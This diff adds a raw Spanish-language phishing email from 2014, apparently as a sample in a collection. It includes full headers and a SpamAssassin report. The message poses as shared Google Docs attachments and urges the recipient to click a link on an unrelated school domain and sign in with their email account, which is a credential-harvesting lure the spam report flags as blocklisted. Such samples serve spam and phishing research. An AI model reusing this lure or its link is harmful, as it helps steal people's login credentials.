@@ -1,0 +1,114 @@
+Return-path: <josedaniel88@gmail.com>
+Envelope-to: info@courierpack.com.ve
+Delivery-date: Wed, 15 Jan 2014 12:34:12 -0430
+Received: from mail-lb0-f175.google.com ([209.85.217.175]:55117)
+	by host.racksystem2.com with esmtps (TLSv1:RC4-SHA:128)
+	(Exim 4.82)
+	(envelope-from <josedaniel88@gmail.com>)
+	id 1W3Tsw-000SU1-3g
+	for info@courierpack.com.ve; Wed, 15 Jan 2014 12:34:12 -0430
+Received: by mail-lb0-f175.google.com with SMTP id w6so1005780lbh.34
+        for <info@courierpack.com.ve>; Wed, 15 Jan 2014 09:04:08 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:date:message-id:subject:from:to:content-type;
+        bh=1mZUiCoKLf64I1sMKlQK3kBxb4O54RhU2yPKBag5f3I=;
+        b=ZQO1F+PtQCqRun0tN65px2gzm0Y5XykF+q3bV/XRNiBCH0Lt6peE+HiefBgVltbIAz
+         m+BPBbvOUQrCfOZoJpTsgXGTQvKvY9OO7KAxUH8oQt69ziUuy45KGndOEd25iEcmluqY
+         r6cJ6JogzrpU6HxAnxMfdvowE5/PiF0tUqW4Yh7AbRE/2vPhuT/8Q+E40ALKrrDlA3t1
+         zvsIu+jwubh6WBPor+8otMAkQHpgGno/qW37weSV0RZS7NWIzgAHeRiwzjL7z+U9ogSa
+         yBTuwpTF1oC45oqSRSg/0dYrk5NQd0GWyeNDuppsqQ2w3U81VmZs/rmBWII6eDKE13fT
+         0QjQ==
+MIME-Version: 1.0
+X-Received: by 10.153.6.34 with SMTP id cr2mr1920642lad.44.1389805447967; Wed,
+ 15 Jan 2014 09:04:07 -0800 (PST)
+Received: by 10.114.170.102 with HTTP; Wed, 15 Jan 2014 09:04:07 -0800 (PST)
+Date: Thu, 16 Jan 2014 01:04:07 +0800
+Message-ID: <CAB9oQpt_O9kZoX4VoUjQafoHC4bUG6bbhmp94+_fe65248aMNw@mail.gmail.com>
+Subject: =?ISO-8859-1?Q?Echa_un_vistazo_a_los_datos_adjuntos_que_envi=E9_a_us?=
+	=?ISO-8859-1?Q?ted?=
+From: =?ISO-8859-1?B?Sm9zZSBELiBSde16IFAu?= <josedaniel88@gmail.com>
+To: undisclosed-recipients:;
+Content-Type: multipart/alternative; boundary=001a113496aa087ea104f0054cec
+Bcc: info@courierpack.com.ve
+X-Spam-Status: No, score=0.2
+X-Spam-Score: 2
+X-Spam-Bar: /
+X-Ham-Report: Spam detection software, running on the system "host.racksystem2.com", has
+ identified this incoming email as possible spam.  The original message
+ has been attached to this so you can view it (if it isn't spam) or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ 
+ Content preview:  Hola, Echa un vistazo a estos accesorios que le envié a través
+    de documentos. Para el acceso inmediato CLIC AQUÍ<http://infocolegio.com.ve/kingsmen/2013googledocs/>
+    y firmar con su correo electrónico. [...] 
+ 
+ Content analysis details:   (0.2 points, 5.0 required)
+ 
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail provider
+                             (josedaniel88[at]gmail.com)
+ -0.0 SPF_PASS               SPF: sender matches SPF record
+  0.2 FREEMAIL_ENVFROM_END_DIGIT Envelope-from freemail username ends in
+                             digit (josedaniel88[at]gmail.com)
+  0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
+                             [URIs: infocolegio.com.ve]
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  0.0 T_KHOP_FOREIGN_CLICK   T_KHOP_FOREIGN_CLICK
+ -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from author's
+                             domain
+  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily valid
+ -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
+X-Spam-Flag: NO
+
+--001a113496aa087ea104f0054cec
+Content-Type: text/plain; charset=ISO-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+Hola,
+
+Echa un vistazo a estos accesorios que le envi=E9 a trav=E9s de documentos.
+Para el acceso inmediato CLIC
+AQU=CD<http://infocolegio.com.ve/kingsmen/2013googledocs/> y
+firmar con su correo electr=F3nico.
+
+Respetuosamente,
+
+
+--=20
+Saludos
+
+             ATTE
+             Jos=E9 Daniel Ru=EDz
+
+--001a113496aa087ea104f0054cec
+Content-Type: text/html; charset=ISO-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+<div dir=3D"ltr"><span style=3D"color:rgb(34,34,34);font-family:arial,sans-=
+serif;font-size:13px;font-style:normal;font-variant:normal;font-weight:norm=
+al;letter-spacing:normal;line-height:normal;text-align:start;text-indent:0p=
+x;text-transform:none;white-space:normal;word-spacing:0px;background-color:=
+rgb(255,255,255)">Hola,</span><br style=3D"color:rgb(34,34,34);font-family:=
+arial,sans-serif;font-size:13.3333px;font-style:normal;font-variant:normal;=
+font-weight:normal;letter-spacing:normal;line-height:normal;text-align:star=
+t;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;b=
+ackground-color:rgb(255,255,255)">
+<div style=3D"color:rgb(34,34,34);font-family:arial,sans-serif;font-size:13=
+.3333px;font-style:normal;font-variant:normal;font-weight:normal;letter-spa=
+cing:normal;line-height:normal;text-align:start;text-indent:0px;text-transf=
+orm:none;white-space:normal;word-spacing:0px;background-color:rgb(255,255,2=
+55)">
+<div style=3D"font-size:13px"><div><br></div><div>Echa un vistazo a estos a=
+ccesorios que le envi=E9 a trav=E9s de documentos. Para el acceso inmediato=
+=A0<a href=3D"http://infocolegio.com.ve/kingsmen/2013googledocs/" target=3D=
+"_blank" style=3D"color:rgb(34,34,34);font-family:arial;font-size:small">CL=
+IC AQU=CD</a>=A0y firmar con su correo electr=F3nico.</div>
+<div><br></div><div>Respetuosamente,</div></div></div><br clear=3D"all"><br=
+>-- <br>Saludos<br><br>=A0 =A0 =A0 =A0 =A0 =A0=A0 ATTE<br>=A0 =A0 =A0 =A0 =
+=A0 =A0=A0 Jos=E9 Daniel Ru=EDz
+</div>
+
+--001a113496aa087ea104f0054cec--
